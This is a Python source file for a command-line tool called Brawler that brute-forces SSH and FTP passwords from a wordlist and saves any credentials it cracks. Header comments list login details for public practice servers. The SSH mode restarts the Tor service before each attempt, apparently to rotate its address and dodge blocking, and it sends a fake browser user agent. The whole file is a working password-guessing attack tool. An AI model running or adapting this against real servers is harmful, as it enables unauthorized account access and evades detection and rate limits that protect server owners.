# TEST CREDENTIALS

# SSH:
# https://overthewire.org/wargames/bandit/bandit0.html

# Username = bandit0
# Password = bandit0
# IP Address = bandit.labs.overthewire.org
# Port = 2220

# FTP:
# https://dlptest.com/ftp-test/

# Username = dlpuser
# Password = rNrKYTX9g7z3RgJRmxWuGHbeu
# IP Address = ftp.dlptest.com
# Port = 21

from argparse import ArgumentParser
from logging import basicConfig, DEBUG, debug, disable, CRITICAL
from sys import exit as sysexit
from ftplib import FTP, error_perm
from paramiko import SSHClient, AutoAddPolicy, ssh_exception
from requests import get as get_request
from concurrent.futures import ThreadPoolExecutor, wait

from os import popen, system
import subprocess

# Doing the basic configuration for the debugging feature
basicConfig(level=DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Disabling the debugging feature. Comment out the line to enable debugging.
disable(CRITICAL)

# ANSI escape code for golden color (yellow)
golden_color = '\033[93m'

green_color = '\033[92m'

red_color = '\033[91m'

reset_color = '\033[0m'  # Reset color to default

# Fake User Agent
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0"}

class Brawler:

    def __init__(self, choice, username, target, port, wordlist, output):

        self.version = "Brawler 1.0.1"

        self.choice = choice

        self.username = username

        self.target = target

        self.port = port

        self.wordlist = wordlist

        self.output = output

    def crack_ftp(self):
        """A function which cracks ftp passwords"""

        print(f'{golden_color}Cracking FTP password{reset_color}\n{"-" * 30}')

        port = int(self.port)

        try:

            with open(self.wordlist, 'r') as pw:

                for password in pw:

                    password = password.strip('\r\n')

                    try:
                        
                        print(f'Trying => {{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}" }}')
                        
                        ftp = FTP(timeout=10)

                        ftp.connect(self.target, port)

                        ftp.login(self.username, password)

                        print(f'\n{green_color}Success!{reset_color}\n{"-" * 30}\n{{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}" }}\n')

                        with open(self.output, 'w') as credentials:

                            credentials.write(f'Username = {self.username}\nPassword = {password}\nTarget= {self.target}\nPort = {self.port}\nType = {self.choice}')

                        ftp.quit() 

                    except Error as exc:

                        print(f'{red_color}{exc} Still trying...{reset_color}', )

        except Exception as exc:

            print('Error: ', exc)

    def crack_ssh(self):
        """A function which cracks SSH passwords"""

        print(f'{golden_color}Cracking SSH password{reset_color}\n{"-" * 30}')

        port = int(self.port)

        try:

            with ThreadPoolExecutor(max_workers=3) as executor:

                with open(self.wordlist, 'r') as pw:

                    def attempt_ssh(password):

                        try:

                            print(f'Your IP address = {self.get_public_ip_addr()}\nTrying => {{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}" }}')

                            ssh = SSHClient()

                            ssh.set_missing_host_key_policy(AutoAddPolicy())
                            
                            ssh.connect(self.target, port=port, username=self.username, password=password)

                            print(f'\n{green_color}Success!{reset_color}\n{"-" * 30}\n{{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}" }}\n')

                            with open(self.output, 'w') as credentials:

                                credentials.write(f'Username = {self.username}\nPassword = {password}\nTarget= {self.target}\nPort = {self.port}\nType = {self.choice}')

                            ssh.close()

                            # sysexit()
                        
                        except ssh_exception.AuthenticationException as exc:

                            print(f'{red_color}{exc} Still trying...{reset_color}\n')

                    for password in pw:

                        password = password.strip('\r\n')
                        
                        # Restart the Tor service before each attempt
                        subprocess.run(['sudo', 'service', 'tor', 'restart'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                        # Launch password cracking attempt
                        executor.submit(attempt_ssh, password)

        except Exception as exc:
            print(f'Error: {red_color}{exc}{reset_color}')

    def get_public_ip_addr(self):
        """A function which gets user's public IP address"""
        
        # try:

        #     res = get_request(url='https://ipinfo.io', headers=headers)

        #     res.raise_for_status()

        #     public_ip_addr = str(res.json()['ip']).strip()

        #     return public_ip_addr

        # except requests.exceptions.RequestException as e:

        #     error_msg = f'Error: {e}'

        #     return error_msg

        return popen('curl ifconfig.io').read()

    def display_version(self):
        """A function which displays the app's version"""

        print(self.version)

def main():
    """The function which runs the entire application"""

    # Create an argument parser
    parser = ArgumentParser(description="A command line tool to brute force common web servers.")

    # Add arguments
    parser.add_argument('-v', '--version', action="store_true", help="Display the application's version information",)

    parser.add_argument('choice', choices=['ssh', 'ftp'], nargs="?", help="Choice of platform (ssh, ftp)")

    parser.add_argument('-u', '--username', help="User's username who is authorized in the server")

    parser.add_argument('-t', '--target', help="Target specification")

    parser.add_argument('-p', '--port', help="Port specification")

    parser.add_argument("source_path", nargs="?", help="Source path of your word list")
    
    parser.add_argument("destination_path", nargs="?", help="Destination path of your word list")

    # Parse the arguments
    args = parser.parse_args()

    if args.version:

        app = Brawler(choice=None, username=None, target=None, port=None, wordlist=None, output=None)
    
        app.display_version()

    elif args.choice and args.username and args.target and args.port and args.source_path and args.destination_path:

        if args.choice == "ssh":
            
            app = Brawler(choice=args.choice, username=args.username, target=args.target, port=args.port, wordlist=args.source_path, output=args.destination_path)

            app.crack_ssh()

        elif args.choice == "ftp":

            app = Brawler(choice=args.choice, username=args.username, target=args.target, port=args.port, wordlist=args.source_path, output=args.destination_path)

            app.crack_ftp()

        else:

            print("Invalid choice. Use -h or --help to get more information.")

    else: 

        print("Invalid usage. Use -h or --help to get more information.") 

# Evaluate if the source is being run on its own or being imported somewhere else. With this conditional in place, your code can not be imported somewhere else.
if __name__ == '__main__':

    main()

